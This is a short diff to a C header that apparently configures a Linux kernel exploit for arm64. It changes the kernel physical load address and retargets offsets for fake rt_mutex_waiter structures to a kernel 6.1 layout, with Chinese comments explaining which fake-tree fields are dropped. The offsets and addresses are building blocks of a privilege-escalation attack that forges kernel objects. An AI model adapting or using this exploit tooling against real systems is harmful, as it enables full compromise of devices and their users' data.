@@ -6,7 +6,7 @@
 #define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
 #define P0_PAGE_OFFSET 0xffffff8080000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
-#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
+#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
 #define PSELECT_WAITER_WORD_SHIFT 3
 
 /* kernel image addresses */
@@ -33,11 +33,15 @@
 #define WAITER_PRIO_OFF 0x44
 #define WAITER_DEADLINE_OFF 0x48
 #define WAITER_WW_CTX_OFF 0x50
-#define FAKE_WAITER_TREE_PRIO_OFF 0x44
-#define FAKE_WAITER_TREE_DEADLINE_OFF 0x48
+
+/* 6.1 legacy rt_mutex_waiter: 无 rt_waiter_node 子结构, */
+/* slide/fops/util 用 #ifdef SLIDE_RT_MUTEX_WAITER_LEGACY 切换 6.1 word 布局 */
+#define SLIDE_RT_MUTEX_WAITER_LEGACY 1
+#define FAKE_WAITER_TREE_PRIO_OFF 0  /* 6.1 legacy: 不存在, util.c 用 #ifdef 跳过 (原 0x44) */
+#define FAKE_WAITER_TREE_DEADLINE_OFF 0  /* 6.1 legacy: 不存在, util.c 用 #ifdef 跳过 (原 0x48) */
 #define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
-#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x5c
-#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x60
+#define FAKE_WAITER_PI_TREE_PRIO_OFF 0  /* 6.1 legacy: 不存在, util.c 用 #ifdef 跳过 (原 0x5c) */
+#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0  /* 6.1 legacy: 不存在, util.c 用 #ifdef 跳过 (原 0x60) */
 #define FAKE_WAITER_TASK_OFF 0x30
 #define FAKE_WAITER_LOCK_OFF 0x38
 #define FAKE_WAITER_WAKE_STATE_OFF 0x40
